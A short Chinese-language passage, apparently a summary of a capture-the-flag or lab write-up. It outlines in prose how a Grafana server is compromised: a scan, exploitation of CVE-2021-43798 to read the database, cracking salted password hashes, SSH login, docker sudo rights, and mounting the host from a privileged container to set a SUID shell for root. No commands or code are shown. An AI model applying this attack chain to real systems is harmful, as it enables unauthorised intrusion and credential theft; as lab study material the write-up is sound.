nmap 掃描後，發現一個 Grafana 框架。通過檢查版本信息，確認存在 CVE-2021-43798 漏洞，利用相關漏洞項目進行攻擊，成功執行後獲得了 Grafana 的資料庫文件，其中包含了加鹽的帳號密碼。接著，使用工具将其破解，獲得密碼后以特定用戶通過 SSH 登入系統，进一步取得了類似的 root 權限。透過檢查 sudo 權限，發現可以執行 docker 命令，從而利用該權限在容器中執行特權操作。為了取得系統最高權限，使用爆破技術確定了 docker 容器 ID，成功進入容器後，通過特權模式掛載整個系統的分區，檢索到 root 目錄的敏感文件，進而在掛載目錄中通過設置 SUID 方式，取得外部 shell 訪問的控制，從而完整地破解目標系統。

Guessing container name

如果我想要得到第一個容器，也就是 a1b2c3d4e5f6​，我可以只打開頭的幾個字符，比如 a​、a1​、a1b​這樣。
